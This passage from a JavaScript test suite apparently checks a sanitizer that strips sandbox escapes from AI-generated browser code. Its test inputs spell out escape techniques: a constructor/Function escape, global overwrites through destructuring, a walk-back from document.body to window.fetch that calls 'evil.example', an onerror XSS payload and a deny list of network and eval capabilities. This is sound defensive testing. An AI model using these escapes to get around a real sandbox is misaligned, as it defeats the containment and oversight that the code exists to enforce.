      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(/window\[|document\[/);
    }
  });
});

/**
 * A runtime computed pattern key can bind `constructor`/`__proto__` from any
 * value, and plucked DOM/network sinks bypass the call audit.
 */
describe("model-code audit closes dynamic pattern keys and plucked sinks", () => {
  test("a runtime computed key is stripped on any source", () => {
    const { code, stripped } = sanitize(
      `const k = "constructor";\nconst { [k]: c } = (() => {});\nc("return window")();`,
    );
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toContain("{ [k]");
    expect(code).not.toMatch(/\bc\(/);
  });

  test("plucked insertAdjacentHTML and sendBeacon are stripped", () => {
    const insert = sanitize(
      `const f = el.insertAdjacentHTML;\nf.call(el, "beforeend", "<img src=x onerror=alert(1)>");`,
    );
    expect(insert.stripped).toBeGreaterThan(0);
    expect(insert.code).not.toContain("insertAdjacentHTML");

    const beacon = sanitize(`const b = navigator.sendBeacon;`);
    expect(beacon.stripped).toBeGreaterThan(0);
    expect(beacon.code).not.toContain("sendBeacon");
  });
});

/**
 * A module is always strict: assigning to an identifier it never declares is
 * never a local write — it throws or overwrites a property on the global
 * object (`window.window`, `window.__gu`, `window.Object`). Destructured and
 * loop targets must be judged like direct assignments, while a target that
 * the module DOES declare keeps working.
 */
describe("model-code audit closes unbound destructuring and loop targets", () => {
  const vectors = [
    `({ window } = { window: 1 });`,
    `({ self } = { self: 1 });`,
    `({ Object } = { Object: 1 });`,
    `({ ReactDOMClient } = fake);`,
    `({ __gu } = fake);`,
    `({ a: [window] } = { a: [1] });`,
  ];

  for (const src of vectors) {
    test(src, () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(/window|self|Object|ReactDOMClient|__gu/);
      // The statement parentheses stay around the replaced expression.
      expect(code.trim()).toBe("(void 0);");
    });
  }

  test("locally declared destructuring and loop targets stay untouched", () => {
    const sources = [
      `let top;\n({ top } = el.getBoundingClientRect());`,
      `let top;\nfor ({ top } of rects) {}`,
      `let innerWidth;\n({ innerWidth } = window);`,
    ];
    for (const src of sources) {
      const res = sanitizeModelModule(src);
      expect(res.ok).toBe(true);
      if (!res.ok) continue;
      expect(res.stripped).toEqual([]);
      expect(res.code).toBe(src);
    }
  });
});

/**
 * The pattern audit removes a stripped declaration (`const { fetch: React } =
 * window` -> `void 0;`), so a later write to that binding no longer has a
 * local to land in: it would reach `window.React`. Every write shape — plain,
 * destructured, array, loop, update, rest — must go with it.
 */
describe("model-code audit neutralizes writes to stripped bindings", () => {
  const vectors = [
    `let { fetch: React } = window;\nReact = { fake: true };`,
    `let { fetch: React } = window;\n({ name: React } = { name: fake });`,
    `let { fetch: React } = window;\n[React] = [fake];`,
    `let { fetch: React } = window;\nfor (React of [fake]) {}`,
    `let { fetch: React } = window;\nfor (React in fake) {}`,
    `let { fetch: React } = window;\nReact++;`,
    `let { fetch: React } = window;\n({ ...React } = fake);`,
  ];

  for (const src of vectors) {
    test(src.split("\n")[1], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(/React|fetch|window/);
      expect(code).not.toMatch(/for \(/);
    });
  }

  test("the compiled TSX path neutralizes the same writes", () => {
    for (const src of vectors) {
      const res = compileJsxModule(`export default function App() {\n${src}\n  return <div />;\n}`);
      if (!res.ok) throw new Error(`compile rejected ${src}: ${res.error}`);
      expect(res.stripped.length).toBeGreaterThan(0);
      expect(res.code).not.toMatch(/React|fetch|window/);
      expect(res.code).not.toMatch(/for \(/);
    }
  });

  test("the module-body sanitizer neutralizes the same writes", () => {
    const code = sanitizeModelJS(vectors[0]);
    expect(code).not.toMatch(/React|fetch|window/);
  });
});

/**
 * `export { f }` names a binding that must exist at instantiation: leaving it
 * after the declaration was stripped makes the whole module fail to load
 * ("f is not declared in this file"). Undeclared exports are the same fatal
 * shape; an export list with safe names keeps them.
 */
describe("model-code audit removes named exports of stripped bindings", () => {
  const vectors = [
    `const { fetch: f } = window;\nexport { f };`,
    `const { fetch: f } = window;\nexport { f as g };`,
  ];

  for (const src of vectors) {
    test(src.split("\n").at(-1) ?? src, () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(/export \{|\bfetch\b|\bwindow\b/);
    });
  }

  test("an undeclared export is rejected by the parser (fail closed)", () => {
    const res = sanitizeModelModule(`export { window };`);
    expect(res.ok).toBe(false);
  });

  test("safe specifiers survive a partial strip", () => {
    const src = `const ok = 1;\nconst { fetch: f } = window;\nexport { ok, f };`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toContain("export { ok");
    expect(code).not.toMatch(/\bf\b|fetch|window/);
    expect(() => parse(code, { ecmaVersion: "latest", sourceType: "module" })).not.toThrow();
  });

  test("exporting an imported binding still works", () => {
    const src = `import { useState } from "react";\nexport { useState };`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });
});

/**
 * `document.body[k]` is not an index into a DOM collection: the computed
 * name can be `ownerDocument` / `defaultView` and the chain walks back to
 * the window. Only a NUMERIC index behind a safe static head is an ordinary
 * collection/string read; a capability property name is forbidden on any
 * receiver, since an alias loses the global root.
 */
describe("model-code audit closes dynamic walk-back and aliased capability reads", () => {
  test("a computed walk-back chain cannot reach fetch", () => {
    const src = `const k = "ownerDocument";\nconst d = document.body[k];\nconst j = "defaultView";\nconst w = d[j];\nconst f = w["fetch"];\nf("https://evil.example");`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toMatch(/document\.body\[|\["fetch"\]|\bfetch\b/);
  });

  test("capability property names are forbidden on any receiver", () => {
    const vectors: Array<[string, RegExp]> = [
      [`const f = slot.fetch;`, /\bfetch\b/],
      [`const F = slot.Function;`, /\bFunction\b/],
      [`const e = slot.eval;`, /\beval\b/],
      [`const R = slot.Reflect;`, /\bReflect\b/],
      [`const X = slot.XMLHttpRequest;`, /XMLHttpRequest/],
      [`const W = slot.WebSocket;`, /WebSocket/],
      [`const E = slot.EventSource;`, /EventSource/],
      [`const B = slot.BroadcastChannel;`, /BroadcastChannel/],
      [`const f = slot["fetch"];`, /\bfetch\b/],
    ];
    for (const [src, forbidden] of vectors) {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(forbidden);
    }
  });

  test("a non-numeric dynamic link behind a safe head is cut", () => {
    for (const src of [
      `const k = "ownerDocument";\nconst d = document.body[k];`,
      `const k = "children";\nconst c = document.body.children[k];`,
    ]) {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(/document\.body/);
    }
  });

  test("numeric indices and capability-named props still pass", () => {
    const src = `const el = document.body.children[0];\nconst { fetch } = props;\nconst n = 0;\nconst x = [1, 2][n];\nconst fetch2 = 1;\narr[fetch2]();`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });
});
